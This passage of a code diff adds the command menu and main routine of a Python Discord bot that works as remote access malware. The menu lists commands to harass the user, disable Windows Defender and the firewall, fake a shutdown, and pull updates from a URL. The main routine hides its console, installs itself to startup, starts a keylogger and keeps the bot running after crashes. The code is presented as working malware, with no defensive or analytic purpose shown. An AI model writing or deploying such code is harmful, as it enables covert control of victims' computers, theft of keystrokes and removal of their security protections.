+        "Trolls":      "`!type <text>` `!beep <sec>` `!shake <sec>` `!move <n>` `!wallpaper <url>` `!invert` `!uninvert` `!caps` `!num` `!blackout <sec>` `!unblackout` `!flash <sec>` `!hidebar` `!showbar` `!minimize-all` `!maximize-all` `!alt-tab <n>` `!taskview` `!freeze <sec>`",
+        "System tweaks":"`!disable-defender` `!disable-firewall`",
+        "Fake shutdown":"`!shutdownwatch on|off` `!shutdownrestore`",
+        "Persistence": "`!update <url>` `!persist-service` `!startup-check`",
+    }
+    for name, body in sections.items():
+        embed.add_field(name=name, value=body, inline=False)
+    embed.set_footer(text=f"prefix: !  |  owner only  |  {APP_NAME} v4.1")
+    await ctx.reply(embed=embed)
+
+
+# ============================================================
+#  MAIN
+# ============================================================
+def main():
+    hide_self_console()
+    try:
+        install_to_startup()
+    except Exception:
+        pass
+    # cheap, safe sanity checks
+    try:
+        if os.path.exists(KEYLOG_ON):
+            _start_keylogger()
+    except Exception:
+        pass
+    while True:
+        try:
+            bot.run(BOT_TOKEN, log_handler=None)
+            break
+        except Exception as e:
+            log(f"bot.run crashed: {e} — restarting in 15s")
+            time.sleep(15)
+
+
+if __name__ == "__main__":
+    main()
